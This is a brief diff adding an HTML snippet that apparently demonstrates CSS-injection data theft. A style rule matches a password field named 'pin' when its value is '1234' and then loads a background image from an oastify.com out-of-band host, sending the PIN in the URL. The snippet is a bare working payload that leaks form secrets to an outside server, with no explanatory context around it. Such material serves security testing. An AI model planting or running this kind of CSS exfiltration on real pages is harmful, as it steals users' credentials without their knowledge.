@@ -1,0 +1,6 @@
+<style>
+   input[name="pin"][value="1234"] {
+      background: url(https://gauun68lkr6xzyb4aa4wm6fg278ywpzdo.oastify.com/log?pin=1234);
+   }
+</style>
+<input type="password" name="pin" value="1234">
